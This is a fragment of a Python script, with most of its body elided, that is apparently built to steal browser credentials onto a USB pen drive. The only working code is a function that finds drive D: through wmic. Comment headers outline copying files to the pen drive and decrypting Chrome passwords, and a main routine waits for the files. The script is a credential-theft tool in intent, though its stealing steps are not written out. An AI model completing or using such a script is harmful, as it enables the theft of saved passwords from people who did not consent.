...
# Step 1: Find pen drive
def find_pen_drive():
    drives = os.popen('wmic logicaldisk get caption').readlines()
    for drive in drives:
        if "D:" in drive:  # Modify if needed, e.g., E:, F:, etc.
            return drive.strip()
    return None

# Step 2: Copy files to pen drive folder
...
# Step 3: Decrypt Chrome passwords
...
def main():
    ...
    if result:
        ...
        time.sleep(1)  # Ensure files are ready
